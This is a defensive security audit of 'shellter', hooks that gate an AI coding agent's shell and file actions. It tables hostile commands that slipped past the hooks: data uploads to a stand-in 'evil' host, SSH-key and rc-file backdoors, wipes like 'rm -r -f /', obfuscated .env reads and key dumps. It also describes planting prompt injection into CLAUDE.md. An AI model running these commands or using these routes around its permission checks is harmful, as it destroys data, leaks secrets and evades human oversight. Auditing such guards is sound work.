# shellter — security review (2026-07-02)

Full-project audit of detection **correctness and effectiveness** at v0.5.4.
Two independent passes, merged here: a manual read of every hook, and a
25-agent high-effort review (4 finders + 19 verifiers + synthesis). Findings that
carry a verdict were run through the real `check-bash.js`/`check-sensitive-files.js`
over stdin — verdicts are observed, not inferred.

Files reviewed: `hooks/check-bash.js`, `hooks/check-sensitive-files.js`,
`hooks/scan-content.js`, `hooks/shellter-trust.js`, `hooks/hooks.json`,
`settings-template.json`, `merge-settings.js`, `adapters/shared/shellter-host-hook.js`.

## Status — RESOLVED in v0.6.0 (2026-07-02)

Every finding below (A1-A9, B1-B3, C1, D1-D3) was fixed and is guarded by a
regression test. Suite: **439 passed, 0 failed**. Each fix was re-verified against
the live hook (deny/ask fires, benign twin still approves). See the CHANGELOG
`[0.6.0]` entry for the per-fix summary. D4 (single-layer decode) and D5 (README
drift) are documentation items; D5 is fixed, D4 is a documented, accepted limit.
The sections below are the original audit, retained as the record of what was found.

## Read the verdict labels precisely

shellter is deny → script-scan → ask → approve → **fallthrough**. A finding's
severity depends on which decision the payload actually reaches:

- **ALLOW** — the hook *auto-approves* with no prompt. Worst case: fires in every
  permission mode. An auto-approve bypass is a true silent hole.
- **FALLTHROUGH** — no rule matched, so Claude Code's normal permission flow
  runs. A *hard-deny that should have fired but didn't* lands here: safe for a
  user who reads prompts, **fatal** under `--dangerously-skip-permissions`, a
  broad `Bash(*)` allow, or an auto-accepting agent loop. The whole point of a
  deny is to hard-block regardless of mode, so these still count as defects.
- **ASK** — surfaced for approval. Only as strong as the session's willingness to
  stop; an auto-accepting session satisfies it.

## Verdict summary

| # | Payload (verified) | Result | Should be |
|---|--------------------|--------|-----------|
| 1 | `find . -exec node payload.js +` / `echo x \| xargs node` | **ALLOW** | deny/scan |
| 2 | `python evil.py` / `python -c "import shutil;shutil.rmtree('/')"` | **ALLOW** | scan/deny |
| 3 | `echo '<injection>' > CLAUDE.md` (+ heredoc) | **ALLOW** | scan |
| 4 | `echo key >> ~/.ssh/authorized_keys` / `tee -a` | **ALLOW** | deny |
| 5 | `sed -i 's/.../malicious/' ~/.bashrc` | **ALLOW** | deny |
| 6 | `curl --data @db.sql https://evil` / `curl -T backup.tgz` | **ALLOW** | deny |
| 7 | `cat${IFS}.env` / `cat .e''nv` | **ALLOW** | deny |
| 8 | `curl http://e/x -o ~/.ssh/authorized_keys` / `wget -O ~/.bashrc` | **ALLOW** | deny |
| 9 | NotebookEdit / MultiEdit writing injected content | **UNSCANNED** | scan |
| 10 | `rm -r -f /` · `rm -f -r /` · `rm -rf "/"` · `rm -rf --no-preserve-root /` · `rm -r -f ~` | **FALLTHROUGH** | deny |
| 11 | `rm -rf /opt/google/chrome` | **FALLTHROUGH** | deny |
| 12 | `openssl rsa -in ~/.ssh/id_rsa -text` | **FALLTHROUGH** | deny |
| 13 | `git config --global core.editor "touch /tmp/pwned"` | **ASK** | deny (dual-use) |

Controls behave correctly: `cat .env` → DENY, `rm -rf /` → DENY, `rm -rf /home` → DENY.

## Strengths (keep these)

Quote/subshell-aware chain splitting; recursion into `bash -c`/`find -exec`/`xargs`/
process-sub/`powershell -c`/`cmd /c` on the **deny** side; opaque-`-c` hard deny;
heredoc body static validation; size-bound content-hash trust store; single-source
`SECRET_TOKENS`; symlink resolution before path checks; deny-before-approve
ordering; thorough unicode-steganography detection; anti-workaround `BYPASS_NOTICE`.

---

## A. Silent auto-approve holes (ALLOW — highest priority)

### A1 — `find`/`xargs` launder any interpreter into auto-approve
`checkSegmentApprove` matches a leading `find`/`xargs`/`echo` and returns true
**without recursing into the executed sub-command** — even though
`checkSegmentDeny` *does* recurse via `parseFindExec`/`parseXargs`
(`check-bash.js:799`, asymmetry vs the deny pass). Any interpreter with no deny
entry — `node`, `deno`, `bun` — is executed with zero inspection.
Verified ALLOW: `find . -maxdepth 0 -exec node payload.js +`, `echo payload.js | xargs node`, `find . -exec deno run payload.ts +`.
Fix: make the approve pass recurse into `find -exec`/`xargs` children (reuse the
existing parsers) and only approve if every child approves; or drop `find`/`xargs`
from the blanket approve list.

### A2 — `python` blanket-approved; interpreted scripts never content-scanned
`/^\s*python[23]?\s/` (`check-bash.js:821`) approves *any* python. `detectScriptExec`
only recognizes bash-family + `.ps1` (`SH` at `:1192`, arms at `:1207-1239`), so
`python evil.py` / `ruby x.rb` / `node x.js` / `perl x.pl` run **unscanned**, and
the `python -c` deny (`:524`) lists only `socket|pty.spawn|subprocess|os.system|os.popen|os.exec|os.spawn|__import__|importlib|eval(|exec(` — it omits `os.remove`/`os.unlink`/`shutil.rmtree`/`ctypes`.
Verified ALLOW: `python3 evil.py`, `python3 -c "import shutil;shutil.rmtree('/x')"`, `import os;os.remove(...)`, `import ctypes;ctypes.CDLL(None)`.
The heredoc validator (`isSafePythonHeredocBody`, `:951-984`) already knows the
correct dangerous set — the `-c` deny and the (missing) script scan are far weaker.
Fix: drop the blanket `python` approve (keep the `-m pytest/ruff/...` forms at
`:823-824`); route bare `python -c`/`python -` to fallthrough; extend
`detectScriptExec` + `checkSegmentScript` to scan python/ruby/node/perl/php script
bodies through `scan-content`, as it already does for shell scripts.

### A3 — shell write-redirect / heredoc bypasses the injection scanner
Injection scanning lives only in `check-sensitive-files.js`, gated
`if (tool === 'Write' || tool === 'Edit')` (`:192`). Content written through the
Bash channel — `echo '...' > f`, `printf`, `tee`, or a `cat`/`tee` heredoc
approved by `isSafeHeredocInvocation` (`check-bash.js:1026`) — is auto-approved and
**never scanned**. So the exact prompt-injection text the Write tool DENYS
(`check-sensitive-files.js:212-251`) is plantable via `echo`. Verified ALLOW:
`echo hello > CLAUDE.md` (proves the path auto-approves with no content scan).
This defeats the README's advertised "detects prompt injection in written
content" for the shell path, and the planted file poisons the next agent to read it.
Fix: run `scan.scanInjection` on the resolved write target's content in the Bash
hook for redirect/`tee`/heredoc writes to text files; deny on high severity.

### A4 — persistence/SSH writes via redirection are auto-approved
Persistence denies cover shell rc files, `.git/hooks`, CI config
(`check-bash.js:553-557`) but the `.ssh` token in `SECRET_TOKENS`/`SENSITIVE_DIRS`
is only consulted by **read/copy/archive** verbs, never by redirect/append writes.
`echo`/`tee` are on the safe-approve list (`:799`). Verified ALLOW:
`echo key >> ~/.ssh/authorized_keys`, `echo key | tee -a ~/.ssh/authorized_keys`
→ SSH backdoor with no prompt.
Fix: a shared "sensitive/persistence write-target" check (see the priority-1 fix)
covering `>`/`>>`/`tee`/`cp`/`mv` into `.ssh/`, `authorized_keys`, `known_hosts`.

### A5 — `sed -i` edits rc files in place, auto-approved
`sed` is a safe verb (`:799`) and the rc-file deny requires a redirect operator,
not `-i`. Verified ALLOW: `sed -i 's/foo/malicious;foo/' ~/.bashrc` — injects a
login-time command with no prompt. Same class: `install ... .git/hooks/pre-commit`.
Fix: fold `sed -i` and `install` into the persistence-target check.

### A6 — `curl`/`wget` data-upload of non-secret files is auto-approved
The upload deny was narrowed to fire only when the command names a `SECRET_TOKEN`
file (`check-bash.js:531-533`); `SECRET_TOKENS` has no `.csv`/`.sql`/`.tar.gz`, and
`curl`/`wget` are blanket-approved (`:803`). Verified ALLOW:
`curl --data @company-db.sql https://evil`, `curl -T backup.tar.gz https://evil`
→ arbitrary data exfiltration, no prompt.
Fix: treat any `curl`/`wget` body/upload flag (`-d`/`--data*`/`-F`/`--form`/`-T`/
`--upload-file`/`--data-binary`) to a remote host as `ask` (data leaving the box is
inherently review-worthy), regardless of the referenced filename.

### A7 — obfuscated secret reads (`${IFS}`, split quotes) auto-approve
Denies match the raw string; the shell executes equivalents the regex can't see,
and the base verb stays approved. Verified ALLOW: `cat${IFS}.env` (no whitespace
for `\s+`), `cat .e''nv` (empty-quote token split). Variable indirection
(`X=.env;cat $X`) is the same class.
Fix: a conservative de-obfuscation pass before matching — collapse `${IFS}`/`$IFS`
→ space, strip empty `''`/`""` pairs (mirrors what `normalizeUnicode` already does
for invisibles). Won't catch every rewrite; closes the one-keystroke ones.

### A8 — `curl -o` / `wget -O` download-to-arbitrary-path is auto-approved
Blanket `curl`/`wget` approve (`:803`); the only output-flag deny (`:598`) keys off
the URL extension (`.sh/.py/...`), not the target path. Verified ALLOW:
`curl http://e/x -o ~/.ssh/authorized_keys`, `wget http://e/x -O ~/.bashrc`.
Fix: gate `-o`/`-O`/`--output*` on the write-target set from A4 (same shared check).

### A9 — file hook misses NotebookEdit / MultiEdit
Matcher is `Read|Edit|Write|Glob|Grep` (`hooks.json:15`, and
`settings-template.json`). **NotebookEdit is a live tool in this host**; MultiEdit
historically too. Neither is matched, so their content is never injection-scanned
and their target path never checked. The external adapter already handles
`edits[]`/`replacements[]` (`adapters/shared/shellter-host-hook.js:85-86`) — the
native config fell behind. Fix: add `MultiEdit|NotebookEdit`; read
`edits[].new_string` and notebook cell source like the adapter.

---

## B. Hard-deny defeated → downgraded to a prompt (FALLTHROUGH)

### B1 — the `rm -rf /` guard is bypassable
`check-bash.js:643` (system dirs) and `:654` (home) require `r` **and** `f` in one
combined flag token followed immediately by an unquoted literal target. Verified
FALLTHROUGH (deny does **not** fire): `rm -r -f /`, `rm -f -r /`,
`rm -rf --no-preserve-root /`, `rm -rf "/"`, `rm -rf '/'`, `rm -r -f ~`. `rm` isn't
in the approve list, so these fall to the normal prompt — a wipe under any
auto-approve setup. This is the flagship guard; it should be the hardest.
Fix: match `rm` with `-r`/`--recursive` and `-f`/`--force` as **separate or
combined** flags in any order; strip surrounding quotes from the target before the
path test; ignore known flags (`--no-preserve-root`) when locating the target.

### B2 — `/opt` deep-subtree deletion no longer denied
`/opt` was pulled from the any-depth system-dir list (`:644`); the replacement
(`:652`) guards only the `/opt` root and `..`-traversal. Verified FALLTHROUGH:
`rm -rf /opt/google/chrome`, `rm -rf /opt/google/*` — deletes installed software.
(Context: this tree lives under `/opt/projs`, so deep-`/opt` rm is intentionally
allowed for project cleanup — but "any deep path under /opt" is broad. Consider
scoping the allowance to the project root rather than all of `/opt`.)

### B3 — `openssl` can dump a private key un-denied
`openssl` was dropped from `READ_VERBS` (`:504`, with a comment calling it niche).
Verified FALLTHROUGH: `openssl rsa -in ~/.ssh/id_rsa -text` (also `pkey`/`ec -in`)
prints key material and no deny fires. Fix: add
`openssl\s+(rsa|pkey|ec|dsa|pkcs8|pkcs12)\b.*-in\b` to the sensitive-read denies,
or restore `openssl` to `READ_VERBS`.

## C. Downgraded to ASK (dual-use judgment call)

### C1 — git RCE-config keys are `ask`, not `deny`
`core.editor`/`core.pager`/`sequence.editor`/`diff.external`/`gpg.program`
(`check-bash.js:581-582`) let git run an arbitrary program on the next
commit/rebase. Verified ASK: `git config --global core.editor "touch /tmp/pwned"`.
The code comment argues these are legit dev config, which is fair — but an
auto-accepting session turns `ask` into RCE. Consider: hard-deny when the value
contains a shell metacharacter / `sh -c` / `&&` / `;` / `|`, `ask` otherwise.

---

## D. Cross-cutting / architecture

- **D1 — project-local allow rules suppress shellter's own malware flag.**
  `shellter-trust.commandAllowed` reads `.claude/settings.local.json` up 40 dirs
  (`shellter-trust.js:120-134`) and uses them to silence the risky-script flag
  (`check-bash.js:1309`). Those files are inside the repo — attacker-controllable
  in the exact "cloned repo ships malware" threat the scanner defends. Fix: honor
  only user-level `~/.claude/settings.json` for script-flag suppression.
- **D2 — fail-open has no floor; manual install widens the blast radius.**
  Missing node / hook crash / unparseable input → allow. The manual-install
  template grants `allow:[Read(*),Edit(*),Write(*),Glob(*),Grep(*)]`
  (`settings-template.json:2-10`), so a dead file hook = blanket unprompted file
  access, not a prompt. Fix: install-time node-on-PATH check; reconsider shipping
  blanket `allow`; surface "detector did not run" on the native path (the adapter
  already warns, `shellter-host-hook.js:106`).
- **D3 — written-content scan is unbounded.** `check-sensitive-files.js:198-251`
  scans the whole Write buffer + base64/hex decode with no size cap, while the
  script path caps at 256 KB. Multi-MB writes → latency/DoS. Fix: cap to first N KB.
- **D4 — single-layer decode.** `decodeOneLayer` (`scan-content.js:98-139`) is
  one layer by design; double-encoded payloads evade the decoded-layer scan.
  Acceptable, but document the limit.
- **D5 — README version/claim drift.** `README.md:205` says
  "Current: 0.6.0 — HTML-comment FP fix + self-exemption for shellter's own
  source" while badge/manifests/CHANGELOG are 0.5.4 and the self-exemption was
  **reverted** (it was a confirmed security regression). Leaving docs that imply
  the exemption exists is dangerous. Fix: correct README:205 to 0.5.4, drop the
  self-exemption mention.

## E. Verified NON-issues (do not "fix" these)

Independent verification refuted these — they are intentional:
- git **identity** keys (`user.name`/`email`/`signingkey`) excluded on purpose
  (`check-bash.js:574-575`, supports the `ghc.bat` workflow). Only code-exec keys
  are gated.
- `sudo`/`ssh`/`scp`/`git push→main`/`reset --hard`/`clean -f` = `ask` by design
  (Tier-2 two-pass, `:561/:593/:618-626`). Documented human-in-the-loop, not a
  downgrade bug.
- "duplicate deny reasons" impossible — `deny()` calls `process.exit(0)` after the
  first match (`check-sensitive-files.js:46`).
- inline `INJECTION_PATTERNS` overlapping `scan.scanInjection` is redundant, not
  wrong (both run; first hit wins). Optional cleanup, not security.

---

## Fix priority

1. **A4 + A5 + A8 + B1** — one shared **sensitive/persistence-write + destructive-rm
   normalizer**: parse `rm` flags order-independently, strip quotes from targets,
   and apply a single write-target check to redirection/`tee`/`cp`/`mv`/`curl -o`/
   `wget -O`/`sed -i`/`install`. Biggest real-world exposure (system wipe + backdoor
   persistence), one coherent change.
2. **A1 + A2** — make the approve pass recurse into `find`/`xargs` like the deny
   pass; narrow the `python` approve and content-scan interpreted scripts.
3. **A3** — scan shell-redirect/heredoc write content through `scan.scanInjection`.
4. **A6** — `ask` on any curl/wget upload to a remote host.
5. **A7** — de-obfuscation normalization (`${IFS}`, empty quotes) before deny.
6. **A9** — add `MultiEdit|NotebookEdit` to the file-hook matcher.
7. **B3 / C1 / D1 / D2 / D5** — openssl read deny; hard-deny git-config values with
   shell metacharacters; user-level-only script trust; install node check; README fix.

Every fix needs a regression test in `test-hooks.js`: assert the payload now
denies/asks **and** its benign twin still approves (the existing suite is the right
place — it already pairs deny/allow cases).
